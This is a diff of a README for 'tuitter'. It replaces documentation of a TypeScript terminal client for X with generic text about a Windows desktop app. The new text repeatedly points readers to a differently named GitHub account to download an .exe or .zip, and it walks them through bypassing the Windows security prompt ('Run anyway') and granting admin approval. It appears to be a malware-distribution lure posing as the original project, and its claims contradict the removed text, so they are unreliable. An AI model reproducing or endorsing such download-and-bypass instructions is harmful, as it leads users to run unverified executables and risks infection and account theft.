@@ -1,85 +1,184 @@
-# tuitter
+# 🐦 tuitter - Simple desktop access for Twitter
 
-`tuitter` is a terminal UI client for X (Twitter) built with TypeScript and OpenTUI.  
-It lets you authenticate with your own X account and browse or interact with content directly from the terminal.
+[![Download tuitter](https://img.shields.io/badge/Download%20tuitter-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Markovian-tko592/tuitter)
 
-![tuitter](tuitter.png)
+## 📥 Download
+Use this link to visit the page and download or run the app from there:
 
-## Download, install, and run
+https://github.com/Markovian-tko592/tuitter
 
-### Prerequisites
+## 🖥️ What tuitter does
+tuitter is a simple Windows app for opening and using Twitter in a clean desktop window. It gives you a direct way to keep Twitter close without using a browser tab all day.
 
-- [Bun](https://bun.sh/) installed
-- An X developer app with OAuth 2.0 credentials (see the section below)
+Use it to:
+- Open Twitter in a separate app window
+- Keep your social feed easy to reach
+- Reduce browser clutter
+- Use a simple desktop layout on Windows
 
-### 1) Clone and install dependencies
+## 🚀 Getting Started on Windows
 
-```bash
-git clone https://github.com/<your-org-or-username>/tuitter.git
-cd tuitter
-bun install
-```
+Follow these steps to get tuitter running on your PC.
 
-### 2) Create your local env file
+### 1. Open the download page
+Go to:
 
-```bash
-cp .env.example .env
-```
+https://github.com/Markovian-tko592/tuitter
 
-Then set at least:
+### 2. Find the app file
+On the page, look for the latest release or the main app file. The file name may end in:
+- `.exe`
+- `.zip`
 
-- `X_CLIENT_ID` (required)
+If you see a zipped file, save it to your computer and unzip it first.
 
-Optional:
+### 3. Download the file
+Click the file link and save it to a folder you can find again, such as:
+- Downloads
+- Desktop
+- Documents
 
-- `X_CLIENT_SECRET`
-- `X_REDIRECT_URI` (defaults to `http://127.0.0.1:8787/callback`)
-- `X_OAUTH_SCOPES`
-- `X_TOKEN_STORE_PATH`
-- `X_IMAGE_MODE` (`auto`, `kitty`, or `off`)
+### 4. Run the app
+If you downloaded an `.exe` file, double-click it to start tuitter.
 
-### Optional screen-time limit
+If you downloaded a `.zip` file:
+- Right-click the file
+- Choose Extract All
+- Open the extracted folder
+- Double-click the app file inside
 
-Create a `tuitter.conf` file in the directory where you launch `tuitter`:
+### 5. Allow Windows access if needed
+Windows may show a security prompt the first time you open the app. If that happens:
+- Click More info
+- Click Run anyway
 
-```ini
-MAX_SECONDS=3600
-```
+Only do this if you trust the source and the file is the one you meant to download.
 
-- `MAX_SECONDS` sets your maximum allowed usage per day.
-- Daily usage is tracked in a local `.tuitter` state file in that same directory.
-- When the limit is exceeded, tuitter shows a large red warning banner in the UI.
+## 🧭 First Use
+When tuitter opens, you should see a clean window for Twitter use. From there, you can:
+- Sign in to your Twitter account
+- Scroll your feed
+- Open posts and replies
+- Keep the app open while you work
 
-Quick use:
+If the app opens to a blank page, wait a moment and refresh it. A slow first load can happen on the first run.
 
-1. Add `MAX_SECONDS=<seconds>` to `tuitter.conf` (example: `MAX_SECONDS=1800` for 30 minutes/day).
-2. Start `tuitter` from that same directory.
-3. When you hit the limit, tuitter blocks usage until the next day.
+## 🔧 System Requirements
+tuitter is made for Windows desktop use. A normal home or work PC should be enough.
 
-### 3) Link and start the app
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A working internet connection
+- A mouse and keyboard
+- Enough disk space for the app and its data
 
-```bash
-bun link
-tuitter
-```
+## ⚙️ How to Install
+Some downloads may run right away. Others may come in a zip file.
 
-On first launch, the app opens your browser for OAuth authorization and then stores your token locally (default: `~/.tuitter/oauth-token.json`).
+If the file is an `.exe`:
+1. Download the file
+2. Double-click it
+3. Follow the on-screen steps
+4. Open tuitter from the shortcut or the folder where you saved it
 
-## Create your own `.env` variables from console.x.com
+If the file is a `.zip`:
+1. Download the zip file
+2. Right-click it
+3. Select Extract All
+4. Open the extracted folder
+5. Run the `.exe` file inside
 
-Use these steps so anyone can run this project with their own X developer app:
+If Windows asks for admin approval, choose the option that lets the app open.
 
-1. Go to [console.x.com](https://console.x.com/) and sign in.
-2. Create a new Project/App (or open an existing app).
-3. In the app settings, enable OAuth 2.0.
-4. Set the callback/redirect URL to:
-   - `http://127.0.0.1:8787/callback`
-5. Copy the **Client ID** into:
-   - `X_CLIENT_ID=...`
-6. If your app is configured as a confidential client, also copy the **Client Secret** into:
-   - `X_CLIENT_SECRET=...`
-7. (Optional) Configure scopes. The app defaults to:
-   - `tweet.read users.read tweet.write like.write like.read bookmark.write bookmark.read offline.access`
-8. Save your `.env` and run `tuitter` again.
+## 🧰 Common Use Tips
+A few simple habits can make the app easier to use:
+- Keep your internet connection stable
+- Leave the app open if you want quick access
+- Sign in once and keep your session active
+- Use a larger screen for easier reading
+- Pin the app to your taskbar if you use it often
 
-If OAuth fails, verify that the callback URL in `console.x.com` exactly matches `X_REDIRECT_URI` in your `.env`.
+## 🐞 If Something Does Not Work
+If tuitter does not open or shows a blank screen, try these steps:
+
+- Close the app and open it again
+- Check your internet connection
+- Download the file again if it may be damaged
+- Restart your PC
+- Make sure Windows did not block the app
+- Try opening the file from a different folder
+
+If the app starts but feels slow:
+- Close other apps you do not need
+- Wait for the first page load to finish
+- Check whether your network is slow
+
+## 📁 Where to Keep the App
+You can keep tuitter in any folder you like. These are common choices:
+- Downloads
+- Desktop
+- Apps
+- Documents
+
+If you want easier access, move the app to a folder that does not change often.
+
+## 🔒 Privacy and Account Use
+tuitter opens Twitter in a desktop window, so your account use stays tied to your Twitter login. Use your own account and sign out when you are done, especially on shared PCs.
+
+## 📌 Basic Workflow
+A simple way to use tuitter:
+1. Open the app
+2. Sign in to Twitter
+3. Read your feed
+4. Post or reply
+5. Close the app when you are finished
+
+## 🖱️ Helpful Windows Shortcuts
+These shortcuts can make the app easier to use:
+- `Alt + Tab` to switch between open windows
+- `Ctrl + R` to refresh a page
+- `Alt + F4` to close the app
+- `Win + D` to show the desktop
+
+## 📦 File Types You May See
+You may see one of these file types on the download page:
+- `.exe` — run this file directly
+- `.zip` — extract it first, then run the app
+- `.msi` — use the Windows installer if provided
+
+## 🧩 Expected Behavior
+When tuitter works as intended, you can expect:
+- A desktop window for Twitter
+- Fast access without opening a browser
+- A simple layout that is easy to use
+- Normal Windows controls like minimize, maximize, and close
+
+## 📍 Download and Run
+Visit this page to download or run tuitter:
+
+https://github.com/Markovian-tko592/tuitter
+
+## 🛠️ Troubleshooting Checklist
+If you need to check the basics, use this list:
+- The file finished downloading
+- The file is not still in a zip archive
+- Windows did not quarantine the app
+- Your internet works
+- Your Twitter login is correct
+- You are opening the right file
+
+## 💬 Use on a Shared Computer
+If more than one person uses the same PC:
+- Do not save your password in a public profile
+- Sign out when done
+- Close the app fully after use
+- Remove the file if the PC is not yours
+
+## 📎 Need-to-Know Steps
+To keep it simple:
+- Download the file from the link above
+- Save it to your PC
+- Open or extract the file
+- Run the app
+- Sign in and use Twitter from the window
